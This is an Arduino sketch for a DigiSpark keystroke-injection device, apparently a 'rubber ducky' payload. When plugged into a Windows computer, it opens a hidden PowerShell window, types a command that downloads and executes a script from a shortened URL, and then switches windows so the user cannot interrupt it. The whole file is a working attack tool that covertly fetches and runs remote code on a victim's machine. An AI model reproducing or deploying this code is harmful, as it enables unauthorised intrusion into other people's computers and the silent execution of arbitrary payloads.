#include "DigiKeyboard.h"

// Keys
#define KEY_TAB 0x2B

void setup() { // The code goes inside setup since it should only run once.

    // Init LED and wait for ducky to init
    pinMode(1, OUTPUT);
    DigiKeyboard.delay(750);

    // Open a hidden Powershell window
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(150);
    DigiKeyboard.println("powershell -W h"); // PowerShell.exe -WindowStyle Hidden
    DigiKeyboard.delay(300);

    // Download and run the rest of the script
    DigiKeyboard.println("iex(iwr -useb bit.do/eSLgf)");

    // Alt-Tab away from the PS window (So people can't do Ctrl+C to stop it)
    DigiKeyboard.sendKeyStroke(KEY_TAB, MOD_ALT_LEFT);

    // All done, turn on LED so you know you can unplug it
    DigiKeyboard.delay(100);
    digitalWrite(1, HIGH);

    // The ducky can be unplugged now since the script is running in the background.
}

void loop() {} // Nothing
